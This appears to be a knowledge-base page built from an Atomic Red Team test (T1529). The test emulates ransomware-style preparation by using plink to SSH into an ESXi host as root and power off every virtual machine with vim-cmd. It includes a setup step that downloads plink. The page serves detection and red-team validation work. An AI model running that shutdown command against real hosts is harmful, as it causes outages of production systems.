---
atomic_guid: "622cc1a0-45e7-428c-aed7-c96dd605fbe6"
title: "ESXi - vim-cmd Used to Power Off VMs"
framework: "atomic"
generated: "true"
attack_technique_id: "T1529"
attack_technique_name: "System Shutdown/Reboot"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.yaml"
build_date: "2026-04-26 17:02:13"
executor: "command_prompt"
aliases:
  - "622cc1a0-45e7-428c-aed7-c96dd605fbe6"
  - "ESXi - vim-cmd Used to Power Off VMs"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# ESXi - vim-cmd Used to Power Off VMs

Adversaries may power off VMs to facilitate the deployment of ransomware payloads.
[Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vim-cmd/#power%20off%20vm)

## Metadata

- Atomic GUID: 622cc1a0-45e7-428c-aed7-c96dd605fbe6
- Technique: T1529: System Shutdown/Reboot
- Platforms: windows
- Executor: command_prompt
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1529/T1529.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1529-system_shutdown_reboot|T1529]]

## Input Arguments

### plink_file

- description: Path to Plink
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe

### vm_host

- description: Specify the host name or IP of the ESXi server.
- type: string
- default: atomic.local

### vm_pass

- description: Specify the privileged user's password.
- type: string
- default: password

### vm_user

- description: Specify the privilege user account on the ESXi server.
- type: string
- default: root

## Dependencies

Check if we have plink

### Prerequisite Check

```powershell
if (Test-Path "#{plink_file}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "#{plink_file}"
```

## Executor

- elevation_required: False
- name: command_prompt

### Command

```cmd
echo "" | "#{plink_file}" -batch "#{vm_host}" -ssh -l #{vm_user} -pw "#{vm_pass}" "for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/power.off $i & done"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.yaml)
